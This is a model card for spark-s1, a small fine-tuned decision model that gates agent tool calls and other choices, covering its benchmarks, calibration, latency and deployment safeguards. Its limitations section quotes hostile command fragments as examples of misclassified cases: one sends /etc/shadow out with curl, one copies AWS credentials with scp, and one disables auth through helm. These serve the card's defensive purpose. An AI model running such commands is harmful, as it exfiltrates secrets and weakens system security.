# Model Card

**spark-s1**, release v3 (`spark-s1-4b-v3`, `spark-s1-1.7b-v3`), 2026-09-20. Part of Open Spark Jev, an open-source project of the Nokast AI community. This is a very early release; expect it to change quickly.

## Overview

`spark-s1` is a System-1 decision model: given a state (text or JSON) and a typed question with options defined at request time, it returns a probability for every option and a confidence from one forward pass, without generating text. Each release is a public Qwen3 backbone fine-tuned with LoRA (r=16, merged into the weights). There is no extra head: the answer is the softmax of the first-token logits restricted to the option letters, divided by a temperature.

It is not Jev and not affiliated with TypeSafe AI. It follows the same contract and readout idea; its training is a supervised fine-tune, not TypeSafe's undisclosed method.

## Intended use

* Bounded, repeated control decisions inside an agent harness: approve, escalate or refuse a proposed tool call, route a request, choose among fixed options, decide whether to hand off to a stronger model or a person.
* Behind deterministic policy checks, least privilege and human approval (see below), with a conservative auto-allow threshold.
* Local, low-latency use where a generative model plus JSON parsing is too slow or too brittle.

## Out-of-scope use

* As the only authorization control for tool execution, or for any high-impact action without a human in the loop.
* Open-ended conversation, coding, general reasoning, summarisation or any task that needs generated text.
* Decisions with more than 26 options, multi-select, ranking, or non-English input (not evaluated).
* Vulnerability detection in code (near chance, see limitations) and any domain not listed below.

## Supported decision tasks

Question types: Choice (up to 26 options), Score (ordered levels), Boolean. Status by task, on the os-datagen locked test (`spark-s1-4b-v3`; most packs have only 2-12 test rows, so treat these as noisy):

| Task pack | Locked-test result (4B) | Status |
|---|---|---|
| Tool-call risk posture (readonly / destructive / privileged / exfiltration) | 51/60 on the diagnostic set | Benchmarked, diagnostic only |
| Tool-action gate (allow / deny / confirm / repair) | 4/5 | Trained, small test |
| Semantic entailment | 30/32 | Trained |
| Document type, relevance | 12/12, 9/9 | Trained |
| Rule application (Boolean) | 6/6 | Trained |
| Extraction validation | 8/10 | Trained |
| Communication intent | 5/5 | Trained, small test |
| Prompt-injection gate | 2/2 | Trained, very small test |
| Temporal reasoning | 3/5 | Weak |
| Authorization gate | 2/4 | Weak |
| Retrieval gate | 3/6 | Weak |
| Answer sufficiency | 3/6 | Weak |
| Termination gate | 7/12 | Weak |
| Next-action router | 1/4 | Weak |
| Communication urgency (Score) | 0/3 | Weak |
| Vulnerable-code detection (external suite) | 0.56 accuracy | Not supported |

The Decision Lab's `allow` / `ask` / `deny` output is a mapping of the benchmarked four-way risk-posture question (readonly to `allow`, destructive and privileged to `ask`, exfiltration to `deny`). That mapping is ours and has not been benchmarked as its own task; asking `allow`/`ask`/`deny` directly ("direct" mode) gave unreliable answers on the ten fixtures and is not recommended.

## Available variants

| Release id | Backbone | Weights | Notes |
|---|---|---|---|
| `spark-s1-4b-v3` | Qwen3-4B | [`abhishek085/spark-s1-4b-v3`](https://huggingface.co/abhishek085/spark-s1-4b-v3) (8.0 GB) | Accuracy pick |
| `spark-s1-1.7b-v3` | Qwen3-1.7B | [`abhishek085/spark-s1-1.7b-v3`](https://huggingface.co/abhishek085/spark-s1-1.7b-v3) (3.4 GB) | Speed pick; uneven transfer |

Earlier research checkpoints (simulator-era `sft-v2`, RLCD variants, architecture variants A0-A4) are described in [docs/MODELS.md](docs/MODELS.md) and are not part of this release.

## Training/data summary

* **Data:** 967 training rows from `os-datagen` ([`datagen-pipeline/`](datagen-pipeline/), [dataset](https://huggingface.co/datasets/abhishek085/spark-s1-osdg-v1)): 15 task packs, labels established by code (policy engines, symbolic solvers, controlled worlds, a sandbox), text written by an LLM and checked by an independent verifier model. Each choice row is also shown in 4 random option orders (4,277 training examples). Splits: 132 calibration, 121 locked test and 124 challenge rows, from scenario families never seen in training.
* **Recipe:** LoRA r=16 (alpha 32) on all attention and MLP projections, 3 epochs, lr 2e-4, cross-entropy plus a Brier regulariser. One seed.
* **Not used:** no real public text, no tool-call-risk data, no data from the diagnostic set, no outcome-based (RLCD) training.
* Generator and verifier models: Gemma-4-26B-A4B, Qwen3.6-35B-A3B, Qwen3.6-27B (see [NOTICE](NOTICE)).

## Evaluation summary

| Measure | 4B | 1.7B | Notes |
|---|---|---|---|
| os-datagen locked test / challenge accuracy | 0.785 / 0.790 | 0.603 / 0.694 | n=121 / 124 |
| 60-case tool-call diagnostic set | 0.850 | 0.783 | Jev (recorded): 0.917. Diagnostic, not a locked holdout |
| Kev transfer-v4, development / locked test | 0.706 / 0.749 | 0.598 / 0.635 | Kev-4B 0.790 / 0.806; Kev-8B 0.796 / 0.780; Jev (dev) 0.857 |
| Jev-directory (70 questions) | 0.771 | 0.557 | |
| Vulnerable code (400) | 0.560 | 0.520 | Near chance |

Details, per-source tables and the run log: [docs/BENCHMARKS.md](docs/BENCHMARKS.md) (B27, B29-B32), [docs/RUNS.md](docs/RUNS.md). Charts: `docs/img/`.

## Calibration

Post-hoc temperature scaling, fitted on the os-datagen calibration split only. Temperatures are **per question type, global across task packs**: Choice 3.17 (4B) and 4.37 (1.7B). Boolean and Score temperatures are **1.0 (not fitted)** because the calibration split has too few such rows. Choice ECE after calibration: 0.087 on the os-datagen locked test, 0.086 on the 60-case set, 0.076 on Kev's locked transfer test; binary external sources (injection) are worse (ECE about 0.18) because of the unfitted Boolean head. Calibration does not transfer reliably across domains: refit on your own labelled outcomes before relying on thresholds. The shipped `calibration.json` carries these values.

## Latency methodology

Batch size 1, idle GPU, one NVIDIA DGX Spark (GB10), bf16, Hugging Face Transformers, no state-cache reuse, median over the 60 diagnostic rows (4B 65.9 ms p50 and 15.1 decisions/s; 1.7B 29.6 ms and 33.8/s). Prompts on the os-datagen rows are longer (4B about 82 ms), and requests with several questions on one state reuse the cached prefix. The recorded hosted Jev reference (421.6 ms p50, 2.3 decisions/s) comes from a third party's committed run, includes a network round trip and service overhead, and is **not** a like-for-like model comparison. Same-backbone comparison (B33): the untrained Qwen3-4B prompted for JSON took 833 ms (0.833 accuracy, 0 malformed) and the untrained Qwen3-1.7B 390 ms (0.433, 14 of 60 malformed); with thinking on, 16.4 s and 7.6 s.

## Known limitations

* Current known errors include **security-weakening configuration changes** (for example `helm upgrade --set auth.enabled=false`, editing an auth configmap), **sensitive-data and credential exfiltration** commands (`curl -d @/etc/shadow ...`, `scp ~/.aws/credentials ...` were mislabelled by some models), and **cloud synchronisation framed as ordinary backup** activity.
* The 60-case set is small (about ±5 points) and was inspected during development, so it cannot establish broad generalisation or production safety.
* Trained on under a thousand rows: weak on router, urgency, retrieval, termination and answer-sufficiency tasks; results per pack rest on 2-12 test rows.
* Sensitive to how options are defined; option order changes the answer for about 15% of the 60-set rows on the 4B model (5% on os-datagen).
* Boolean and Score heads are uncalibrated and can be confidently wrong.
* Behind Kev-4B/8B and Jev on Kev's out-of-domain suite; the 1.7B transfers unevenly.
* English only; not evaluated adversarially beyond the small adversarial slice.

## Safety and deployment requirements

Do not use a model decision as the only authorization control. Deploy with deterministic policy guardrails ([`open_spark_jev/policy.py`](open_spark_jev/policy.py) is a heuristic starting point, not a security engine), a conservative auto-allow threshold (default 0.995), logging, least-privilege credentials, sandboxing and egress controls, human approval or escalation for sensitive actions, and a kill switch. Unsupported input, parsing errors, an unavailable evaluator, low confidence, or a rule conflict must resolve to `ask` or `deny`, never automatic execution; the bundled gate does this. See [SECURITY.md](SECURITY.md).

## Reproducibility

* Code: this repository; training `scripts/run_v3.sh` (`configs/train/sft.yaml` overrides), evaluation `python -m open_spark_jev.eval.osdg`, diagnostic set `scripts/analysis/final60.py`, Kev comparison `scripts/analysis/plot_kev_comparison.py`.
* Data: [`abhishek085/spark-s1-osdg-v1`](https://huggingface.co/datasets/abhishek085/spark-s1-osdg-v1) revision `11b3bc74545c`; diagnostic set: `data/external/ext-toolcall-risk` (source [themsquared/jev-benchmark](https://github.com/themsquared/jev-benchmark) @ `daf02b3b59b2`, converted file sha256 prefix `247742d4c7f20d27`).
* Seeds: single seed per configuration; no confidence intervals reported yet.
* Hardware: one NVIDIA DGX Spark (GB10).

## Versioning and lineage

Release ids are `spark-s1-<size>-v<n>`. Lineage and parents: [docs/model_lineage.yaml](docs/model_lineage.yaml); changes: [CHANGELOG.md](CHANGELOG.md). Pinned revisions for this release:

| Artifact | Revision |
|---|---|
| `abhishek085/spark-s1-4b-v3` | `292e54892675`; `model.safetensors` sha256 `031ff071b56d02de1d5cb3b97d9293d7d526807bc874f7e838d9b894ef6182d7` |
| `abhishek085/spark-s1-1.7b-v3` | `344230a48384`; `model.safetensors` sha256 `d9c3a38a95c4745c0566d09c03720d70e7864e3e88ac44eac9b34761776c12e8` |
| Backbones | `Qwen/Qwen3-4B`, `Qwen/Qwen3-1.7B` (Apache-2.0) |
